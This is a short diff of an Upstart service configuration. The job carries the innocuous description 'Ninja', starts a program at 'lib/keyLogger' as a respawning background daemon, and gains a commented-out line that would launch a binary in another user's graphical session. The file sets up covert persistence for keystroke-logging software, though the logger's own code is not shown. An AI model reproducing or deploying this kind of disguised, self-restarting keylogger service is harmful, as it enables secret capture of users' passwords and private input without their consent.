@@ -2,6 +2,7 @@
 description "Ninja"
 
 # Start job via the daemon control script. Replace "gert" with your username.
+#exec su -l marcin -c 'export DISPLAY=:0; /home/marcin/Dokumenty/a.out'
 exec 'lib/keyLogger'
 
 # When to start the service
@@ -15,4 +16,4 @@ stop on runlevel [016]
 respawn
 
 # Give up if restart occurs 10 times in 90 seconds.
-#respawn limit 10 90
+respawn limit 10 90
